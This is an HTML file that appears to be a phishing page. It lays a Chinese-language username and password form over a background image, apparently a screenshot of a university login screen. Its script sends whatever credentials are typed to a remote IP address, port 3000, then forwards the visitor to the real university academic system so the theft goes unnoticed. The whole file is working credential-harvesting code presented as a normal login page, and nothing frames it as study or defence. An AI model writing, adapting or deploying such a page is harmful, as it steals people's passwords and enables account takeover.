<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <style>
        html, body {
            margin: 0;
            padding: 0;
            width: 100vw;   
            height: 100vh;
            overflow: hidden; 
        }
        .bg-container {
            position: relative;
            width: 100%;
            height: 100%;
            aspect-ratio: 16/9;
            margin: auto;
            background: url("./1.png") no-repeat center;
            background-size: cover;
        }
        .form-group {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-134.5%, -39.8%); 
            display: flex;
            flex-direction: column;
            gap: 36px;
        }
        .form-group input {
            width: 312px;
            height: 46px;
            padding: 0 10px;
            border: 1px solid #ccc;
            border-radius: 4px;
            outline: none;
            font-size: 17px;
        }
        .form-group input:focus {
            border-color: #2D8CF0;
            box-shadow: 0 0 2px rgba(69, 139,255,0.5);
        }
        .form-group input::placeholder {
            font-size: 17px;
            color: #ccc;
        }
        .form-group button {
            width: 334px;
            height: 46px;
            background-color: #2D8CF0;
            color: #fff;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 21px;
        }
    </style>
</head>
<body>
    <div class="bg-container">
        <div class="form-group">
            <input type="text" id="input1" placeholder="请输入用户名">
            <input type="password" id="input2" placeholder="请输入密码">
            <button onclick="submitForm()">登录</button>
        </div>
    </div>

    <script>
        function submitForm() {
            fetch('http://132.232.239.11:3000/save', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    username: document.getElementById('input1').value,
                    password: document.getElementById('input2').value
                })
            })
            .then(response => {
                if (!response.ok) throw new Error(`HTTP错误:${response.status}`);
                return response.text();
            })
            .then(data => {
                console.log('保存成功：', data);
                window.location.href = 'http://jwxt.gsupl.edu.cn/';
            })
            .catch(error => {
                console.error('请求失败：', error);
                window.location.href = 'http://jwxt.gsupl.edu.cn/';
        });
}
    </script>
</body>
</html>
